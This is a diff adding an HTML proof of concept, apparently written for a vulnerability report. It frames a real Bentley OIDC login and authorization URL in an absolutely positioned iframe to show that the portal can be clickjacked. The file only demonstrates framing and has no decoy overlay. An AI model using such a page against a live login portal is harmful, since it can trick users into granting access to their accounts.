@@ -1,0 +1,13 @@
+<html>
+	<--Clickjacking Vulnerable in Login Portal--> 
+	<style>
+		iframe { 
+		width: 800px; 
+		height: 500px; 
+		position: absolute; 
+		top: 0; left: 0; 
+		filter: alpha(opacity=800); 
+		}  
+	</style>
+	<iframe src="https://imsoidc.bentley.com/connect/authorize?client_id=synchro-construction-inspections-webapp&redirect_uri=https%3A%2F%2Fconnect-agencyinspectionweb-aue.bentley.com%2Fsignin-oidc&response_type=code&scope=openid%20profile%20email%20organization%20global_roles%20feature_tracking%20agency-inspection-data%3Aread%20agency-inspection-data%3Awrite%20reality-data%3Aread%20agency-inspection-data%3Aimport%20forms-data-access-2346%20product-settings-service%20projectwise-documents-2766%20projectwise-share%20projectwise-share-2567%20projectwise-web-connections-service%20repository-federation-2567%20context-registry-service%20rbac-service%20map-layer%20sc-webapi%20pdf-geo-indexing-2846%20synchro-document-registry-service%20imodelhub%20sso%3A%2F%2Fpw-integration-server%2F1016&state=7c578b06a6054477b062b6b95f513f8b&code_challenge=kpa5sNaUjnkh8pA9Ko5LZkPI9TR6vGqzC-c0qWr7rxU&code_challenge_method=S256&response_mode=query">
+</html>
